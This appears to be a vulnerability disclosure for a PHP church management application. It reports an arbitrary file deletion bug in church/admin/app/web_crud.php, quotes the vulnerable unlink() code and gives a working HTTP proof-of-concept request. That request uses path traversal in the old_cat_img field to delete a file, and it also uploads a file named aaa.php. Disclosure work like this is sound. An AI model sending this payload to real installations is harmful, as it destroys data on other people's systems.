### Vulnerability file address

In line 129 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_cat_img']);`,` $_POST['old_cat_img']` parameters have not been restricted, which causes any file to be deleted

```php
if (isset($_POST['update1'])) {
        if ($_FILES['photo2']['tmp_name'] != '') {
            $file_extension = pathinfo($_FILES['photo2']['name'], PATHINFO_EXTENSION);
            $unique_filename = uniqid() . '.' . $file_extension;
            $filepath = "../../assets/images/" . $unique_filename;

            if (move_uploaded_file($_FILES["photo2"]["tmp_name"], $filepath)) {
                $img = $unique_filename;

                @unlink("../../assets/images/" . $_POST['old_cat_img']);
            }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 370

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update1"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_cat_img"

../../3.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="photo2";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `3.txt` file in the `church/` directory

![image-20250504204551536](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042045577.png)

Then we execute the above poc to attack

![image-20250504210137104](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042101133.png)

Files are deleted after the attack is successful

![image-20250504210146111](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042101139.png)